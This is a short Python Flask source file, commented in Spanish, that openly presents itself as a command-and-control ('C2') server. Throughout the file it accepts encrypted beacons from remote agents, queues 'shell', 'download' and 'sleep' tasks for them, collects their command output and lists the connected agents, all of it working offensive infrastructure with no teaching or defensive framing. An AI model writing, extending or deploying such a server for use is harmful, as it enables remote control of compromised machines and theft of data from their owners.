from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import json

app = Flask(__name__)

SECRET_KEY = Fernet.generate_key()
cipher = Fernet(SECRET_KEY)

print(f"[!] CLAVE: {SECRET_KEY.decode()}")

# Almacenamiento 
tasks = {}

def encrypt_data(data):
    if isinstance(data, dict):
        data = json.dumps(data)
    encrypted = cipher.encrypt(data.encode())
    return encrypted.decode()

def decrypt_data(data):
    decrypted = cipher.decrypt(data.encode())
    return json.loads(decrypted.decode())

@app.route('/api/status', methods=['POST'])
def status():
    """Beacon endpoint - agente pregunta por tareas"""
    encrypted = request.json.get('data')
    beacon_info = decrypt_data(encrypted)
    agent_id = beacon_info.get('id')
    
    # Crear entrada si no existe
    if agent_id not in tasks:
        tasks[agent_id] = []
        print(f"[+] Nuevo agente conectado: {agent_id[:8]}")
    
    # Extraer UNA tarea 
    task = tasks[agent_id].pop(0) if tasks[agent_id] else None
    
    if task:
        print(f"[→] Enviando tarea a {agent_id[:8]}: {task}")
    
    response = {"task": task} if task else {"task": None}
    encrypted_response = encrypt_data(response)
    
    return jsonify({"data": encrypted_response})
@app.route('/api/upload', methods=['POST'])
def upload():
    encrypted = request.json.get('data')
    result_info = decrypt_data(encrypted)
    
    agent_id = result_info.get('id')
    output = result_info.get('output')
    
    print(f"[+] Resultado de {agent_id[:8]}:")
    print(f"    {output}\n")
    
    encrypted_response = encrypt_data({"status": "received"})
    return jsonify({"data": encrypted_response})

@app.route('/api/push', methods=['POST'])
def push():

    agent_id = request.json.get('id')
    task = request.json.get('task')
    
    if agent_id not in tasks:
        tasks[agent_id] = []
    
    # Ahora guardamos la tarea completa (diccionario)
    tasks[agent_id].append(task)
    
    return jsonify({"status": "queued"})

@app.route('/admin/agents', methods=['GET'])
def list_agents():
    """Lista todos los agentes conectados"""
    agent_list = []
    for agent_id in tasks.keys():
        agent_list.append({
            'id': agent_id,
            'id_short': agent_id[:8],
            'pending_tasks': len(tasks[agent_id])
        })
    return jsonify({
        "agents": agent_list, 
        "total": len(agent_list)
    })

if __name__ == "__main__":
    print("[*] Servidor C2")
    print("\n[*] Tipos de tareas soportadas:")
    print("    - shell: Ejecutar comandos")
    print("    - download: Descargar archivos")
    print("    - sleep: Cambiar intervalo de beacon")
    print("\n[*] Servidor funcionando en http://0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000)
